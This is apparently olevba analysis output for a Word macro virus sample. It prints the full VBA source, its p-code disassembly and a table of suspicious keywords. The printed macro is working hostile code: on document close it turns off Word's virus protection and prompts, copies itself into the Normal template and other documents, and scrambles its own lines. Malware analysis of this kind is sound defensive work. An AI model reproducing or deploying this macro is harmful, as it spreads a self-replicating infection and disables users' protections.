olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

Options.SaveNormalPrompt = 0

Options.VirusProtection = 0

Options.ConfirmConversions = 0

JF2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

HU49 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set AD36 = ActiveDocument.VBProject.VBComponents.Item(1)

GU78 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set AD36 = NormalTemplate.VBProject.VBComponents.Item(1)

UV8 = True

End If

If UV8 <> True And GU78 <> True Then GoTo SK26

If UV8 = True Then AD36.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JF2 - 1))

If GU78 = True Then AD36.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HU49 - 1))

With AD36.CodeModule

For x = 2 To (AD36.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

UP45 = UP45 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & UP45 & (Chr(65 + Int(Rnd * 22)))

UP45 = ""

Next x

End With

SK26:

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.CPCK-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3308 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St JF2 
' Line #11:
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St HU49 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD36 
' Line #19:
' Line #20:
' 	LitVarSpecial (True)
' 	St GU78 
' Line #21:
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD36 
' Line #27:
' Line #28:
' 	LitVarSpecial (True)
' 	St UV8 
' Line #29:
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Ld UV8 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld GU78 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo SK26 
' 	EndIf 
' Line #33:
' Line #34:
' 	Ld UV8 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld JF2 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld AD36 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #35:
' Line #36:
' 	Ld GU78 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld HU49 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld AD36 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	Ld AD36 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld AD36 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	For 
' Line #43:
' Line #44:
' 	Ld UP45 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	St UP45 
' Line #45:
' Line #46:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' Line #48:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld UP45 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' Line #50:
' 	LitStr 0x0000 ""
' 	St UP45 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' Line #54:
' 	EndWith 
' Line #55:
' Line #56:
' 	Label SK26 
' Line #57:
' Line #58:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

